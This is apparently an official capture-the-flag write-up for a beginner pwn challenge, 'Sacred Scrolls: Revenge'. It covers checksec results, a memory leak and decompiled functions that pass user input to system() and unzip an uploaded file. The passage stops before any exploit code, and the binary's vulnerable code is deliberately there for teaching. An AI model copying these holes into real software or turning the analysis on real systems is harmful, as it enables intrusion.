Sacred Scrolls:
Revenge
18th Nov 2022 / Document No.
D22.102.262
Prepared By: ir0nstone
Challenge Author(s): w3th4nds
Difficulty: Very Easy
Classification: Official

Synopsis
Sacred Scrolls: Revenge is a Very Easy pwn challenge that features sending a .zip file with nc in
the base64 format and a ret2libc

Skills Required
Basic python

Skills Learned
Encoding files as base64 and transmitting them

Analysis
First of all, we start with a checksec :
[*] './sacred_scrolls'
Arch:

amd64-64-little

RELRO:

Full RELRO

Stack:

No canary found

NX:

NX enabled

PIE:

No PIE (0x400000)

RUNPATH:

b'./glibc/'

Protections
As we can see:
Protection
Canary
NX
PIE
RelRO

Enabled

❌
✅
❌

Full

The interface of the program looks like this:

Usage
Prevents Buffer Overflows
Disables code execution on stack
Randomizes the base address of the binary
Makes some binary sections read-only

The first bug is already visible here. If you enter a small tag, you get a leak from the uninitialized
big buffer. We could potentially use this to leak a libc address.

Disassembly
main()
Initially, the decompilation looks like this:
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
void *v3; // rsp

__int64 v4; // rax
__int64 *v5; // rax
__int64 v6; // rcx
__int64 v7; // rcx
__int64 v8; // rcx
__int64 v9; // rcx
__int64 v10; // rcx
__int64 v11; // rcx
__int64 v12; // rcx
__int64 v13; // rcx
__int64 v14; // rcx
__int64 v15; // rcx
__int64 v16; // rcx
__int64 v17; // rcx
__int64 v18[25]; // [rsp+0h] [rbp-100h] BYREF
void *buf; // [rsp+C8h] [rbp-38h]
__int64 v20; // [rsp+D0h] [rbp-30h]
int v21; // [rsp+DCh] [rbp-24h]
setup(argc, argv, envp);
banner();
clean();
printf("\nEnter your wizard tag: ");
v21 = 1536;
v20 = 1535LL;
v3 = alloca(1536LL);
buf = v18;
read(0, v18, 0x5FFuLL);
printf("\nInteract with magic library %s", (const char *)buf);
memset(v18, 0, sizeof(v18));
while ( 1 )
{
while ( 1 )
{
v4 = menu();
if ( v4 != 2 )
break;
v5 = (__int64 *)spell_read();
v6 = v5[1];
v18[0] = *v5;
v18[1] = v6;
v7 = v5[3];
v18[2] = v5[2];
v18[3] = v7;
v8 = v5[5];
v18[4] = v5[4];
v18[5] = v8;
v9 = v5[7];
v18[6] = v5[6];
v18[7] = v9;
v10 = v5[9];
v18[8] = v5[8];
v18[9] = v10;
v11 = v5[11];
v18[10] = v5[10];
v18[11] = v11;

v12 = v5[13];
v18[12] = v5[12];
v18[13] = v12;
v13 = v5[15];
v18[14] = v5[14];
v18[15] = v13;
v14 = v5[17];
v18[16] = v5[16];
v18[17] = v14;
v15 = v5[19];
v18[18] = v5[18];
v18[19] = v15;
v16 = v5[21];
v18[20] = v5[20];
v18[21] = v16;
v17 = v5[23];
v18[22] = v5[22];
v18[23] = v17;
v18[24] = v5[24];
printf(asc_401F80, v18);
}
if ( v4 == 3 )
{
spell_save(v18);
exit(22);
}
if ( v4 == 1 )
spell_upload();
}
}

We can clean this up, but the general gist makes sense - the tag is read into buf and a choice v4
is made. There are some functions of interest that get run based on our choice:
1 - spell_upload()
2 - spell_read()
3 - spell_save()
menu() is just the menu, nothing important.

spell_upload()
In spell_upload() , it takes in the base64 of a zip file. It then runs echo '<input>' | base64 -d
> spell.zip to save it on the remote side, which is piped to bash. There is a check for invalid

characters, so a user cannot use command injection to get a shell.
int spell_upload()
{
char dest[4096]; // [rsp+0h] [rbp-1220h] BYREF
char buf[520]; // [rsp+1000h] [rbp-220h] BYREF
__int64 fd; // [rsp+1208h] [rbp-18h]
unsigned __int64 ptr; // [rsp+1210h] [rbp-10h]
unsigned __int64 i; // [rsp+1218h] [rbp-8h]

memset(buf, 0, 0x200uLL);
memset(dest, 0, sizeof(dest));
printf("\n[*] Enter file (it will be named spell.zip): ");
ptr = read(0, buf, 0x1FFuLL);
buf[ptr - 1] = 0;

// null-terminate

// check for invalid characters
for ( i = 0LL; i < ptr; ++i )
{
if ( (buf[i] <= 96 || buf[i] > 122)
&& (buf[i] <= 64 || buf[i] > 90)
&& (buf[i] <= 47 || buf[i] > 57)
&& buf[i] != 46
&& buf[i]
&& buf[i] != 43
&& buf[i] != 61 )
{
printf("\n%s[-] File contains invalid charcter: [%c]\n", "\x1B[1;31m",
(unsigned int)buf[i]);
exit(20);
}
}
// the base64 inputted is decoded using bash by being piped to system
strcpy(dest, "echo '");
strcat(dest, buf);
strcat(dest, "' | base64 -d > spell.zip");
system(dest);
fd = (__int64)fopen("spell.zip", "rb");
if ( !fd )
{
printf("%s\n[-] There is no such file!\n\n", "\x1B[1;31m");
exit(-69);
}
printf("%s\n[+] Spell has been added!\n%s", "\x1B[1;32m", "\x1B[1;34m");
return close(fd);
}

spell_read()
char *spell_read()
{
FILE *stream; // [rsp+10h] [rbp-10h]
char *ptr; // [rsp+18h] [rbp-8h]
ptr = (char *)malloc(0x190uLL);
system("unzip spell.zip");
stream = fopen("spell.txt", "rb");
if ( !stream )
{
printf("%s\n[-] There is no such file!\n\n", "\x1B[1;31m");
exit(-69);
}
fread(ptr, 0x18FuLL, 1uLL, stream);
if ( strncmp(ptr, &s2, 4uLL) || strncmp(ptr + 4, &byte_401327, 3uLL) )
{

printf("%s\n[-] Your file does not have the signature of the boy who
lived!\n\n", "\x1B[1;31m");
exit(1312);
}
close((int)stream);
return ptr;
}

This function returns a char * and we need to keep that in mind. It actually unzips the file (if it's a
valid zip) and then reads the content of the spell.txt which is what the .zip should contain. After
